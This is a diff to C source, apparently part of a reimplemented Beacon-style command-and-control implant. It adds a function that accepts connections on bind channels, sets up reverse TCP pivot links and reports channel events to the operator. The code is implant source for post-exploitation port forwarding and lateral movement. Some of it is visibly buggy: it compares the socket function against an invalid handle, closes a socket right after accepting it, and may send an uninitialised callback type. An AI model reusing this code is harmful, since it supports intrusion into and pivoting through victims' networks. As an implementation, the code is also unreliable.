@@ -3,7 +3,9 @@
 #include "channel.h"
 
 #include "beacon.h"
+#include "link.h"
 #include "network.h"
+#include "protocol.h"
 
 typedef struct CHANNEL_ENTRY
 {
@@ -14,7 +16,7 @@ typedef struct CHANNEL_ENTRY
 	int type;
 	int port;
 	int creationTime;
-	HANDLE socket;
+	SOCKET socket;
 	struct CHANNEL_ENTRY* next;
 } CHANNEL_ENTRY;
 
@@ -378,5 +380,109 @@ void ChannelRemoveAllInactive()
 		}
 		notClosed:
 		prev = channel;
+	}
+}
+
+void ChannelHandleActivity()
+{
+	fd_set writefds;
+	fd_set exceptfds;
+	fd_set readfds;
+
+	int channelId = 0;
+	struct timeval timeout = { 0, 100 };
+	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
+	{
+		if (channel->state != CHANNEL_STATE_2)
+			continue;
+
+		channelId = htonl(channel->id);
+
+		FD_ZERO(&writefds);
+		FD_ZERO(&exceptfds);
+		FD_ZERO(&readfds);
+
+		FD_SET((SOCKET)channel->socket, &writefds);
+		FD_SET((SOCKET)channel->socket, &exceptfds);
+		FD_SET((SOCKET)channel->socket, &readfds);
+
+		select(0, &readfds, &writefds, &exceptfds, &timeout);
+		SOCKET sock = (SOCKET)channel->socket;
+		if (channel->type == CHANNEL_TYPE_BIND)
+		{
+			if (FD_ISSET(sock, &readfds))
+			{
+				sock = accept(channel->socket, NULL, NULL);
+				int argp = 1; // 1 = non-blocking
+				if (ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR)
+				{
+					closesocket(sock);
+					return;
+				}
+
+				channelId = ChannelGetId();
+				ChannelAdd(sock, channelId, 180000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_1);
+
+				formatp locals;
+				BeaconFormatAlloc(&locals, 128);
+				BeaconFormatInt(&locals, channelId);
+				BeaconFormatInt(&locals, channel->port);
+
+				int cbLength = BeaconFormatLength(&locals);
+				char* cbData = BeaconFormatOriginal(&locals);
+				BeaconOutput(CALLBACK_ACCEPT, cbData, cbLength);
+
+				BeaconFormatFree(&locals);
+			}
+		} else
+		{
+			if (channel->type == CHANNEL_TYPE_TCP_PIVOT)
+			{
+				if (FD_ISSET(sock, &readfds))
+				{
+					sock = accept(channel->socket, NULL, NULL);
+					PROTOCOL protocol;
+					ProtocolTcpInit(&protocol, sock);
+					LinkAdd(&protocol, channel->port | HINT_PROTO_TCP | HINT_REVERSE);
+				}
+			} else
+			{
+				int type;
+				if (FD_ISSET(sock, &exceptfds))
+				{
+					channel->state = CHANNEL_STATE_0;
+					type = CALLBACK_CLOSE;
+				}
+				else if (FD_ISSET(sock, &writefds))
+				{
+					channel->state = CHANNEL_STATE_1;
+					type = CALLBACK_CONNECT;
+				}
+				else if (FD_ISSET(sock, &readfds))
+				{
+					sock = accept(channel->socket, NULL, NULL);
+					channel->socket = sock;
+
+					if (socket == INVALID_HANDLE_VALUE)
+					{
+						channel->state = CHANNEL_STATE_0;
+						type = CALLBACK_CLOSE;
+					}
+					else
+					{
+						channel->state = CHANNEL_STATE_1;
+						type = CALLBACK_CONNECT;
+					}
+					closesocket(sock);
+				}
+				else if (GetTickCount() - channel->creationTime > channel->timeoutPeriod)
+				{
+					channel->state = CHANNEL_STATE_0;
+					type = CALLBACK_CLOSE;
+				}
+
+				BeaconOutput(type, &channelId, sizeof(channelId));
+			}
+		}
 	}
 }
